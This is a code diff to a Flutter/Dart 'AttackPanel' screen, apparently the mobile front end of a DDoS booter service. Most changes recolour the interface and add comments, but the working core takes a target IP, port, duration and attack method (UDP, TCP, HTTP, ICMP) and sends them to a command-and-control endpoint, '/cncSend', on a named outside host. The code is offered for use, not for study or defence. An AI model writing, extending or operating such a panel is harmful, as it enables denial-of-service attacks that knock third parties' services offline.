@@ -2,20 +2,20 @@ import 'dart:math' as math;
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
+import 'api_config.dart';
 
-// ─── Palette (Ungu Tua) ──────────────────────────────────────────────────────────────────
+// ─── Palette ──────────────────────────────────────────────────────────────────
 class _C {
-  static const bg        = Color(0xFF1A0B2E);
-  static const surface   = Color(0xFF2D1B4E);
-  static const card      = Color(0xFF3D2A5E);
-  static const border    = Color(0xFF5A4A7A);
-  static const borderLit = Color(0xFF6B5A8A);
+  static const bg        = Color(0xFF060B14);
+  static const surface   = Color(0xFF0C1424);
+  static const card      = Color(0xFF101A2E);
+  static const border    = Color(0xFF1A2D4A);
+  static const borderLit = Color(0xFF1E3A5F);
 
-  static const purple    = Color(0xFF6A1B9A);
-  static const purpleMid = Color(0xFF9C27B0);
-  static const purpleLight= Color(0xFFCE93D8);
-  static const purpleFrost= Color(0xFFE1BEE7);
-  static const gold      = Color(0xFFFFD700);
+  static const blue      = Color(0xFF1B6FBD);
+  static const blueMid   = Color(0xFF2D8FE8);
+  static const blueLight = Color(0xFF56AEF5);
+  static const blueFrost = Color(0xFF90CEF7);
 
   static const red       = Color(0xFFEF4444);
   static const redGlow   = Color(0xFFDC2626);
@@ -23,16 +23,16 @@ class _C {
   static const green     = Color(0xFF22C55E);
 
   static const text      = Color(0xFFE2EDF9);
-  static const textSub   = Color(0xFFB39DDB);
-  static const textDim   = Color(0xFF7A6A9A);
+  static const textSub   = Color(0xFF7A9BBF);
+  static const textDim   = Color(0xFF3A5470);
 
   static const LinearGradient btnGrad = LinearGradient(
-    colors: [purpleMid, purpleLight],
+    colors: [blueMid, blueLight],
     begin: Alignment.topLeft,
     end: Alignment.bottomRight,
   );
   static const LinearGradient launchGrad = LinearGradient(
-    colors: [Color(0xFF6A1B9A), Color(0xFF9C27B0), Color(0xFFCE93D8)],
+    colors: [Color(0xFFDC2626), Color(0xFFEF4444), Color(0xFFF97316)],
     begin: Alignment.topLeft,
     end: Alignment.bottomRight,
   );
@@ -56,12 +56,12 @@ class _AttackPanelState extends State<AttackPanel>
     with TickerProviderStateMixin {
   final targetCtrl = TextEditingController();
   final portCtrl   = TextEditingController();
-  final String baseUrl = "http://100memberprivet.surnxuesk.biz.id:10897";
 
   String selectedDoosId = "";
   double attackDuration = 60;
   bool _isSending = false;
 
+  // Animations
   late AnimationController _bgCtrl;
   late AnimationController _radarCtrl;
   late AnimationController _entranceCtrl;
@@ -124,6 +124,7 @@ class _AttackPanelState extends State<AttackPanel>
     super.dispose();
   }
 
+  // ─── API ────────────────────────────────────────────────────────────────────
   Future<void> _sendDoos() async {
     final target   = targetCtrl.text.trim();
     final port     = portCtrl.text.trim();
@@ -143,7 +144,7 @@ class _AttackPanelState extends State<AttackPanel>
     setState(() => _isSending = true);
     try {
       final uri = Uri.parse(
-          '$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId'
+          'http://100memberprivet.surnxuesk.biz.id:10897/cncSend?key=$key&target=$target&ddos=$selectedDoosId'
           '&port=${port.isEmpty ? 0 : port}&duration=$duration');
       final res  = await http.get(uri);
       final data = jsonDecode(res.body);
@@ -164,6 +165,7 @@ class _AttackPanelState extends State<AttackPanel>
     }
   }
 
+  // ─── Result dialog ────────────────────────────────────────────────────────
   void _showResult(String title, String message, {required _ResultType type}) {
     final color = switch (type) {
       _ResultType.success => _C.green,
@@ -223,6 +225,7 @@ class _AttackPanelState extends State<AttackPanel>
     );
   }
 
+  // ─── Build ────────────────────────────────────────────────────────────────
   @override
   Widget build(BuildContext context) {
     final isIcmp = selectedDoosId.toLowerCase() == 'icmp';
@@ -279,8 +282,8 @@ class _AttackPanelState extends State<AttackPanel>
             width: 8, height: 8,
             decoration: BoxDecoration(
               shape: BoxShape.circle,
-              color: _C.purpleMid,
-              boxShadow: [BoxShadow(color: _C.purpleMid.withOpacity(0.6), blurRadius: 8)],
+              color: _C.red,
+              boxShadow: [BoxShadow(color: _C.red.withOpacity(0.6), blurRadius: 8)],
             ),
           ),
           const SizedBox(width: 10),
@@ -293,6 +296,7 @@ class _AttackPanelState extends State<AttackPanel>
     );
   }
 
+  // ─── Radar Hero ───────────────────────────────────────────────────────────
   Widget _buildRadarHero() {
     return AnimatedBuilder(
       animation: _radarCtrl,
@@ -306,13 +310,13 @@ class _AttackPanelState extends State<AttackPanel>
               decoration: BoxDecoration(
                 shape: BoxShape.circle,
                 gradient: const LinearGradient(
-                  colors: [_C.purpleMid, _C.purple],
+                  colors: [_C.redGlow, _C.red],
                   begin: Alignment.topLeft,
                   end: Alignment.bottomRight,
                 ),
                 boxShadow: [
                   BoxShadow(
-                    color: _C.purpleMid.withOpacity(0.5),
+                    color: _C.red.withOpacity(0.5),
                     blurRadius: 20,
                     spreadRadius: 2,
                   ),
@@ -326,12 +330,13 @@ class _AttackPanelState extends State<AttackPanel>
     );
   }
 
+  // ─── Target + Port card ────────────────────────────────────────────────────
   Widget _buildTargetCard(bool isIcmp) {
     return _SectionCard(
       icon: Icons.gps_fixed_rounded,
       title: 'Target',
       subtitle: 'IP address & port tujuan',
-      accentColor: _C.purpleMid,
+      accentColor: _C.red,
       children: [
         _FieldLabel('Target IP'),
         const SizedBox(height: 6),
@@ -355,6 +360,7 @@ class _AttackPanelState extends State<AttackPanel>
     );
   }
 
+  // ─── Duration card ────────────────────────────────────────────────────────
   Widget _buildDurationCard() {
     return _SectionCard(
       icon: Icons.timer_rounded,
@@ -417,12 +423,13 @@ class _AttackPanelState extends State<AttackPanel>
     );
   }
 
+  // ─── Method card ──────────────────────────────────────────────────────────
   Widget _buildMethodCard() {
     return _SectionCard(
       icon: Icons.flash_on_rounded,
       title: 'Metode Serangan',
       subtitle: 'Pilih protokol / vektor DDoS',
-      accentColor: _C.purpleLight,
+      accentColor: _C.blueLight,
       children: [
         Container(
           padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
@@ -462,12 +469,15 @@ class _AttackPanelState extends State<AttackPanel>
             ),
           ),
         ),
+
+        // Method info chip
         const SizedBox(height: 12),
         _MethodChip(id: selectedDoosId),
       ],
     );
   }
 
+  // ─── Launch button ────────────────────────────────────────────────────────
   Widget _buildLaunchButton() {
     return AnimatedBuilder(
       animation: _btnPulseCtrl,
@@ -480,14 +490,14 @@ class _AttackPanelState extends State<AttackPanel>
             height: 58,
             decoration: BoxDecoration(
               gradient: const LinearGradient(
-                colors: [Color(0xFF6A1B9A), Color(0xFF9C27B0), Color(0xFFCE93D8)],
+                colors: [Color(0xFFDC2626), Color(0xFFEF4444), Color(0xFFF97316)],
                 begin: Alignment.topLeft,
                 end: Alignment.bottomRight,
               ),
               borderRadius: BorderRadius.circular(18),
               boxShadow: [
                 BoxShadow(
-                  color: _C.purpleMid.withOpacity(
+                  color: _C.red.withOpacity(
                       _isSending ? 0.2 : _btnGlow.value * 0.55),
                   blurRadius: 24,
                   offset: const Offset(0, 6),
@@ -540,14 +550,14 @@ class _AttackPanelState extends State<AttackPanel>
     return Container(
       padding: const EdgeInsets.all(14),
       decoration: BoxDecoration(
-        color: _C.purple.withOpacity(0.05),
+        color: _C.red.withOpacity(0.05),
         borderRadius: BorderRadius.circular(12),
-        border: Border.all(color: _C.purple.withOpacity(0.2)),
+        border: Border.all(color: _C.red.withOpacity(0.2)),
       ),
       child: const Row(
         crossAxisAlignment: CrossAxisAlignment.start,
         children: [
-          Icon(Icons.warning_amber_rounded, color: _C.amber, size: 16),
+          Icon(Icons.warning_amber_rounded, color: _C.red, size: 16),
           SizedBox(width: 10),
           Expanded(
             child: Text(
@@ -563,15 +573,17 @@ class _AttackPanelState extends State<AttackPanel>
   }
 }
 
+// ─── Method color ─────────────────────────────────────────────────────────────
 Color _methodColor(String id) {
   final lower = id.toLowerCase();
   if (lower.contains('udp'))  return const Color(0xFFF59E0B);
   if (lower.contains('tcp'))  return const Color(0xFF3B82F6);
   if (lower.contains('http')) return const Color(0xFF10B981);
-  if (lower.contains('icmp')) return _C.purpleLight;
-  return _C.purpleLight;
+  if (lower.contains('icmp')) return const Color(0xFFA78BFA);
+  return _C.blueLight;
 }
 
+// ─── Method chip ──────────────────────────────────────────────────────────────
 class _MethodChip extends StatelessWidget {
   final String id;
   const _MethodChip({required this.id});
@@ -606,6 +618,7 @@ class _MethodChip extends StatelessWidget {
   }
 }
 
+// ─── Duration bar ─────────────────────────────────────────────────────────────
 class _DurationBar extends StatelessWidget {
   final double value;
   const _DurationBar({required this.value});
@@ -633,6 +646,7 @@ class _DurationBar extends StatelessWidget {
   }
 }
 
+// ─── Section Card ─────────────────────────────────────────────────────────────
 class _SectionCard extends StatelessWidget {
   final IconData icon;
   final String title;
@@ -666,6 +680,7 @@ class _SectionCard extends StatelessWidget {
       child: Column(
         crossAxisAlignment: CrossAxisAlignment.stretch,
         children: [
+          // Header
           Container(
             padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
             decoration: BoxDecoration(
@@ -704,6 +719,7 @@ class _SectionCard extends StatelessWidget {
   }
 }
 
+// ─── Attack Input ─────────────────────────────────────────────────────────────
 class _AttackInput extends StatefulWidget {
   final TextEditingController controller;
   final String hint;
@@ -744,11 +760,11 @@ class _AttackInputState extends State<_AttackInput> {
         color: widget.enabled ? _C.surface : _C.surface.withOpacity(0.5),
         borderRadius: BorderRadius.circular(14),
         border: Border.all(
-          color: _focused ? _C.purpleMid : _C.border,
+          color: _focused ? _C.blueMid : _C.border,
           width: _focused ? 1.5 : 1.0,
         ),
         boxShadow: _focused
-            ? [BoxShadow(color: _C.purpleMid.withOpacity(0.1),
+            ? [BoxShadow(color: _C.blueMid.withOpacity(0.1),
                 blurRadius: 12, offset: const Offset(0, 4))]
             : [],
       ),
@@ -760,12 +776,12 @@ class _AttackInputState extends State<_AttackInput> {
         style: TextStyle(
             color: widget.enabled ? _C.text : _C.textDim,
             fontSize: 14, fontWeight: FontWeight.w500),
-        cursorColor: _C.purpleMid,
+        cursorColor: _C.blueMid,
         decoration: InputDecoration(
           hintText: widget.hint,
           hintStyle: const TextStyle(color: _C.textDim, fontSize: 13),
           prefixIcon: Icon(widget.icon,
-              color: widget.enabled ? (_focused ? _C.purpleLight : _C.textSub) : _C.textDim,
+              color: widget.enabled ? (_focused ? _C.blueLight : _C.textSub) : _C.textDim,
               size: 18),
           border: InputBorder.none,
           contentPadding:
@@ -776,6 +792,7 @@ class _AttackInputState extends State<_AttackInput> {
   }
 }
 
+// ─── Field Label ──────────────────────────────────────────────────────────────
 class _FieldLabel extends StatelessWidget {
   final String text;
   const _FieldLabel(this.text);
@@ -788,6 +805,7 @@ class _FieldLabel extends StatelessWidget {
   }
 }
 
+// ─── Radar Painter ────────────────────────────────────────────────────────────
 class _RadarPainter extends CustomPainter {
   final double t;
   _RadarPainter(this.t);
@@ -798,30 +816,33 @@ class _RadarPainter extends CustomPainter {
     final cy = size.height / 2;
     final maxR = size.width / 2;
 
+    // Grid rings
     for (int i = 1; i <= 3; i++) {
       final r = maxR * i / 3;
       canvas.drawCircle(
         Offset(cx, cy),
         r,
         Paint()
-          ..color = _C.purple.withOpacity(0.12)
+          ..color = _C.red.withOpacity(0.12)
           ..style = PaintingStyle.stroke
           ..strokeWidth = 1,
       );
     }
 
+    // Crosshair
     final crossPaint = Paint()
-      ..color = _C.purple.withOpacity(0.15)
+      ..color = _C.red.withOpacity(0.15)
       ..strokeWidth = 0.8;
     canvas.drawLine(Offset(cx, cy - maxR), Offset(cx, cy + maxR), crossPaint);
     canvas.drawLine(Offset(cx - maxR, cy), Offset(cx + maxR, cy), crossPaint);
 
+    // Sweep arc
     final sweepAngle = t * math.pi * 2;
     final sweepPaint = Paint()
       ..shader = SweepGradient(
         startAngle: sweepAngle - 1.2,
         endAngle: sweepAngle,
-        colors: [Colors.transparent, _C.purple.withOpacity(0.5)],
+        colors: [Colors.transparent, _C.red.withOpacity(0.5)],
       ).createShader(Rect.fromCircle(center: Offset(cx, cy), radius: maxR))
       ..style = PaintingStyle.fill;
     canvas.drawArc(
@@ -832,8 +853,9 @@ class _RadarPainter extends CustomPainter {
       sweepPaint,
     );
 
+    // Sweep line
     final sweepLine = Paint()
-      ..color = _C.purple.withOpacity(0.8)
+      ..color = _C.red.withOpacity(0.8)
       ..strokeWidth = 1.5;
     canvas.drawLine(
       Offset(cx, cy),
@@ -842,6 +864,7 @@ class _RadarPainter extends CustomPainter {
       sweepLine,
     );
 
+    // Random blip dots that "appear" when sweep passes
     final rand = math.Random(42);
     for (int i = 0; i < 4; i++) {
       final angle  = rand.nextDouble() * math.pi * 2;
@@ -849,6 +872,7 @@ class _RadarPainter extends CustomPainter {
       final blipX  = cx + math.cos(angle) * dist;
       final blipY  = cy + math.sin(angle) * dist;
 
+      // Fade based on how far behind the sweep this blip is
       final diff   = (sweepAngle - angle) % (math.pi * 2);
       final opacity = math.max(0.0, 1.0 - diff / (math.pi * 2));
 
@@ -856,13 +880,13 @@ class _RadarPainter extends CustomPainter {
         canvas.drawCircle(
           Offset(blipX, blipY),
           3,
-          Paint()..color = _C.purple.withOpacity(opacity * 0.9),
+          Paint()..color = _C.red.withOpacity(opacity * 0.9),
         );
         canvas.drawCircle(
           Offset(blipX, blipY),
           6,
           Paint()
-            ..color = _C.purple.withOpacity(opacity * 0.3)
+            ..color = _C.red.withOpacity(opacity * 0.3)
             ..style = PaintingStyle.stroke
             ..strokeWidth = 1,
         );
@@ -874,6 +898,7 @@ class _RadarPainter extends CustomPainter {
   bool shouldRepaint(_RadarPainter old) => old.t != t;
 }
 
+// ─── Animated Background ──────────────────────────────────────────────────────
 class _AnimatedBg extends StatelessWidget {
   final AnimationController controller;
   const _AnimatedBg({required this.controller});
@@ -906,7 +931,7 @@ class _BgPainter extends CustomPainter {
     }
     final glow = Paint()
       ..shader = RadialGradient(colors: [
-        _C.purple.withOpacity(0.07 + math.sin(t * math.pi * 2) * 0.02),
+        _C.red.withOpacity(0.07 + math.sin(t * math.pi * 2) * 0.02),
         Colors.transparent,
       ], radius: 0.8).createShader(Rect.fromCircle(
           center: Offset(size.width / 2, size.height * 0.2),
@@ -919,6 +944,7 @@ class _BgPainter extends CustomPainter {
   bool shouldRepaint(_BgPainter old) => old.t != t;
 }
 
+// ─── Shared: Back Button ──────────────────────────────────────────────────────
 class _BackBtn extends StatefulWidget {
   final VoidCallback onTap;
   const _BackBtn({required this.onTap});
@@ -953,6 +979,7 @@ class _BackBtnState extends State<_BackBtn> {
   }
 }
 
+// ─── Shared: GradBtn ──────────────────────────────────────────────────────────
 class _GradBtn extends StatefulWidget {
   final String label;
   final VoidCallback onTap;
@@ -992,7 +1019,7 @@ class _GradBtnState extends State<_GradBtn> {
             gradient: widget.gradient,
             borderRadius: BorderRadius.circular(13),
             boxShadow: _down ? [] : [
-              BoxShadow(color: _C.purpleMid.withOpacity(0.3),
+              BoxShadow(color: _C.blueMid.withOpacity(0.3),
                   blurRadius: 14, offset: const Offset(0, 4)),
             ],
           ),
@@ -1009,4 +1036,5 @@ class _GradBtnState extends State<_GradBtn> {
   }
 }
 
+// ─── Result type ──────────────────────────────────────────────────────────────
 enum _ResultType { success, warning, error }
